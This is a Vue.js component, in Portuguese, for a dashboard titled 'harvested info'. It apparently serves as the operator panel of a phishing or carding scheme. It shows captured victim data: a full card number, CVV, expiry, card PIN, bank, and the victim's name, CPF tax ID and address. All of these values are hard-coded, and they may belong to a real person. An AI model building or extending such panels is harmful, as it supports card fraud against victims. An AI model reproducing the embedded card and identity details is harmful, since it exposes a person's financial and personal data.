<template>
  <main>
    <NewNav />

    <section>
      <div class="header">
        <span class="material-symbols-rounded">store</span>
        <h2>INFOS COLHIDAS</h2>
      </div>

      <div class="info-section">
        <table>
          <tr>
            <th>Sexo</th>
            <th class="info-header">Info</th>
            <th class="bandeira-header">Bandeira</th>
            <th class="banco-header">Banco</th>
            <th class="senha-header">Senha</th>
            <th class="nome-header">Nome</th>
            <th class="acao-header">Ação</th>
          </tr>
          <tr>
            <td>{{ sexo }}</td>
            <td>{{ numero }}</td>
            <td>{{ bandeira }}</td>
            <td>{{ banco }}</td>
            <td>{{ senha }}</td>
            <td class="nome-body">{{ nome }}</td>
            <td><button @click="toggleModal">Abrir</button></td>
          </tr>
        </table>
      </div>
      <div v-show="showModal" class="modal">
        <div class="modal-content">
          <table class="tabela-modal">
            <h4><span class="material-symbols-rounded">text_snippet</span>Dados do cartão</h4>
            <tr>
              <th>Número</th>
              <td>{{ numeroFormatado }}</td>
            </tr>
            <tr>
              <th>Banco</th>
              <td>{{ banco }}</td>
            </tr>
            <tr>
              <th>Data</th>
              <td>{{ data }}</td>
            </tr>
            <tr>
              <th>CVV</th>
              <td>{{ cvv }}</td>
            </tr>
            <tr>
              <th>Forma</th>
              <td>{{ forma }}</td>
            </tr>
            <tr>
              <th>Bandeira</th>
              <td>{{ bandeira }}</td>
            </tr>
            <tr>
              <th>Senha</th>
              <td>{{ senha }}</td>
            </tr>
            <h4><span class="material-symbols-rounded">demography</span>Dados pessoais</h4>
            <tr>
              <th>Nome</th>
              <td>{{ nome }}</td>
            </tr>
            <tr>
              <th>CPF</th>
              <td>{{ cpf }}</td>
            </tr>
            <tr>
              <th>Sexo</th>
              <td>{{ sexo }}</td>
            </tr>
            <h4><span class="material-symbols-rounded">globe_asia</span>Endereço</h4>
            <tr>
              <th>Cidade</th>
              <td>{{ cidade }}</td>
            </tr>
            <tr>
              <th>Rua</th>
              <td>{{ rua }}</td>
            </tr>
            <tr>
              <th>Estado</th>
              <td>{{ estado }}</td>
            </tr>
            <tr>
              <th>CEP</th>
              <td>{{ cep }}</td>
            </tr>
          </table>
          <button @click="toggleModal">Fechar</button>
        </div>
      </div>
    </section>
    <div v-show="showModal" class="overlay"></div>
  </main>
</template>

<script setup>
import NewNav from '../components/NewNav.vue'
import { ref, computed } from 'vue'
const sexo = ref('Feminino')
const numero = ref('5268630663447100')
const banco = ref('ITAU UNIBANCO, S.A.')
const bandeira = ref('MASTERCARD')
const senha = ref('2544')
const nome = ref('Luciana Gabriela L. da Silva Santos')
const cpf = ref('053.566.183-52')
const rua = ref('Rua 4')
const cidade = ref('Lagarto')
const estado = ref('SE')
const cep = ref('49400-000')
const data = ref('12/23')
const cvv = ref('788')
const forma = ref('CREDIT')
const numeroFormatado = computed(() => {
  const numeroValor = numero.value
  return `${numeroValor.substring(0, 4)} ${numeroValor.substring(4, 8)} ${numeroValor.substring(
    8,
    12
  )} ${numeroValor.substring(12, 16)} ${numeroValor.substring(16, 26)}`
})

const showModal = ref(false)
const toggleModal = () => (showModal.value = !showModal.value)
</script>

<style scoped>
main {
  height: 100vh;
  display: flex;
  flex-direction: column;
  background-color: #141416;
  align-items: center;
}
section {
  width: 100vw;
  color: #ccc;
  font-family: 'Inter';
  padding: 2rem;
  position: relative;
  top: 5rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}
.header span {
  font-size: 40px;
  padding: 0.3rem;
  background-color: #7d2ae8;
  color: #fff;
  border-radius: 6px;
}
.header {
  display: flex;
  gap: 1rem;
  align-items: center;
}
table {
  margin-top: 1rem;
  border-radius: 6px;
  padding: 0.5rem;
  background-color: #1d1f27;
}
th {
  border-radius: 2px;
  color: #ccc;
  font-size: 14px;
}

td {
  font-weight: 600;
  font-size: 12px;
  color: #c7a0fa;
  width: 15rem;
  text-align: center;
}
.info-header {
  width: 18rem;
}
.nome-header {
  width: 15rem;
}
.acao-header {
  width: 10rem;
}
.nome-tabela {
  font-size: 14px;
}
.banco-header {
  width: 15rem;
  text-align: center;
}
button {
  padding: 0.7rem 1.5rem;
  border: none;
  border-radius: 4px;
  background-color: #7d2ae8;
  font-family: 'Inter';
  font-weight: 600;
  color: #fff;
  cursor: pointer;
  transition: all 0.2s ease-in;
}
button:hover {
  background-color: #6926c1;
}
.infocc {
  font-size: 12px;
}
.name {
  font-size: 12px;
}

.overlay {
  height: 100%;
  width: 100%;
  position: absolute;
  background-color: rgba(0, 0, 0, 0.5);
}
.modal {
  z-index: 5;
  position: absolute;
  display: flex;
  flex-direction: column;
  margin-top: 10rem;
}
.modal img {
  width: 30rem;
}
.modal-content {
  padding: 0.5rem;
  border-radius: 8px;
  padding: 2rem;
  display: flex;
  flex-direction: column;
  gap: 0.5rem;
}
.modal-content strong {
  color: #c7a0fa;
}
.modal-content p {
  font-weight: 500;
}
#card-number {
  position: absolute;
  top: 11.3rem;
  left: 8rem;
  color: #000;
  font-family: 'Space mono';
  font-weight: 400;
}
#card-name {
  position: absolute;
  top: 13rem;
  left: 8rem;
  color: #000;
  font-family: 'Space grotesk';
  font-weight: 600;
  font-size: 14px;
}
.tabela-modal td {
  text-align: left;
}
.tabela-modal th {
  text-align: left;
  width: 5rem;
}
.tabela-modal th {
  display: flex;
  gap: 1rem;
}
.tabela-modal h4 {
  display: flex;
  align-items: center;
  gap: 15px;
  margin-bottom: 20px;
  margin-top: 20px;
}
</style>
